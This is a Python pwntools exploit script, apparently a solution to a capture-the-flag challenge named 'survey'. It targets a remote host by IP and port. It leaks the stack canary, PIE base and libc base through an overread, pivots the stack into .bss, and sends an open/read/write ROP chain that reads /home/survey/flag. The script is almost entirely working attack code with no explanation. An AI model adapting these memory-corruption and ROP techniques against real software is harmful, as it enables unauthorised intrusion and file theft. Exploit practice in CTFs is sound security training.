#!/usr/bin/env python3
from pwn import *

program = "./survey"

elf_prog = ELF(program)

bss =  elf_prog.bss(0x10)
#print(hex(bss))
bss =0x4c00
ptr_into_main = 0x1235 # main+21

pop_rdi = 0x1353 #pop rdi ; ret
pop_rsi = 0x1351 #pop rsi ; pop r15 ; ret
pop_rsp = 0x134d #pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
leave = 0x12e1 # leave ; ret
pop_rdx = 0x12bda6 # pop rdx ; ret
nop = 0x0101a # ret
open_offset = 0x010cc80
gets_offset = 0x0832f0
read_offset = 0x010cf70
write_offset = 0x010d010
syscall = 0x0cf6c5
pop_rax = 0x047cf8 # pop rax ; ret
#proc = process(program)
proc = remote('140.112.31.97', 30201)
payload = b'A'*0x19
proc.sendafter('name : ', payload)

res = proc.recvuntil('\nLeave', drop=True)[7:]

canary = b'\x00' + res[0x19:0x20]
pie = u64(res[0x20:] + b'\x00\x00') - 0x12f0

#print(canary)
print(hex(pie))
#stack pivot
payload = b'A'*0x18 + canary + p64(pie + bss) + p64(pie + ptr_into_main)
proc.sendafter('here : ', payload)


payload = 'A'*0x4
proc.sendafter('name : ', 'm30w')
# leak libc base
payload = b'A'*0x18 + canary + p64(pie + bss) + p64(pie + ptr_into_main)
proc.sendafter('here : ', payload)

payload = b'A'*1
proc.sendafter('name : ', payload)

res = proc.recvuntil('\nLeave', drop=True)[7:]
libc_base = u64(res + b'\x00\x00') - 0x1e6541
print(hex(libc_base))

print(hex(pie + bss))
print(hex(libc_base + syscall))

payload = p64(pie + pop_rdi) + p64(pie + bss - 0x8) + p64(libc_base + gets_offset) + canary + p64(pie + bss - 0x28) + p64(pie + leave)

proc.sendafter('here : ', payload)

Timeout(1)

payload = p64(libc_base + pop_rax) + p64(0x2) + p64(pie + pop_rdi) + p64(pie + bss + 0xd0) + p64(pie + pop_rsi) + p64(0x0) + p64(0x0) + p64(libc_base + pop_rdx) + p64(0x0) + p64(libc_base + syscall) +\
p64(pie + pop_rdi) + p64(0x3) + p64(pie + pop_rsi) + p64(pie + bss + 0x100) + p64(0x0) + p64(libc_base + pop_rdx) + p64(0x30) + p64(libc_base + read_offset) +\
p64(pie + pop_rdi) + p64(0x1) + p64(pie + pop_rsi) + p64(pie + bss + 0x100) + p64(0x0) + p64(libc_base + pop_rdx) + p64(0x30) + p64(libc_base + write_offset) +\
p64(pie + ptr_into_main) +\
b'/home/survey/flag\x00\x00\x00\x00\x00\x00\x00'

proc.sendline(payload)
proc.interactive()